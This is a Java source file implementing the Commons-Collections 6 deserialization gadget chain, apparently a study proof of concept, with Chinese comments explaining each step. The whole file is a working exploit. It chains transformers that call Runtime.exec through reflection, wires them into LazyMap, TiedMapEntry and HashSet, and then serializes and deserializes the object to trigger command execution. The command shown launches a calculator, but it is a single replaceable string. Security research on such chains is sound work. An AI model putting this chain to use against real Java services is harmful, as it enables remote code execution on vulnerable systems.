package com.xiinnn.unser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();

        //随便设置一个值，防止后面再执行put方法的时候调用链子
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("useless"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");

        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put(tiedMapEntry, "def");

        //修改为HashSet调用readObject方法
        HashSet<Object> hashSet = new HashSet<>();
        setFieldValue(hashSet, "map", hashMap2);

        lazyMap.remove("abc");

        //反射修改LazyMap的factory属性，修改为链子的后半段
        setFieldValue(lazyMap, "factory", chainedTransformer);

        byte[] bytes = ser(hashSet);
        unser(bytes);
    }
    public static byte[] ser(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(obj);
        return baos.toByteArray();
    }
    public static Object unser(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(bais);
        return objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}
